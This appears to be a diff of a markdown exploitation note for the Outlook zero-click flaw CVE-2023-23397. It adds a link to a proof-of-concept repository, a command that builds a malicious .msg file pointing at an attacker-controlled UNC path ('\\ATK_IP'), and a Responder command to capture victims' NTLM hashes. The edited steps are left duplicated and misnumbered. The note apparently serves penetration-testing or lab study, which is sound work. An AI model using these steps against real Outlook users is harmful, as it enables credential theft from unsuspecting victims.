@@ -2,6 +2,8 @@
 
 ### Tools: Responder, Outlook Appointment Alerts, OutlookSpy Plugin
 
+Link: https://github.com/Trackflaw/CVE-2023-23397
+
 ### Affects all version of the Outlook desktop app on any Windows System.
 
 ### Exploit method: Zero-click
@@ -28,7 +30,17 @@
 
 ### Exploitation:
 
-#### 1) sudo responder -I INTERFACE
+#### 1) Generate .msg file
+
+    python3 CVE-2023-23397.py --path '\\ATK_IP'
+
+#### 2) Run responder/Inveigh to intercept NTLM hash before sending the email
+    
+    sudo responder -I INTERFACE
+
+#### 1) 
+
+    sudo responder -I INTERFACE
 
 #### 2) On our outlook client, click the calendar, then new appointment to create one.
 
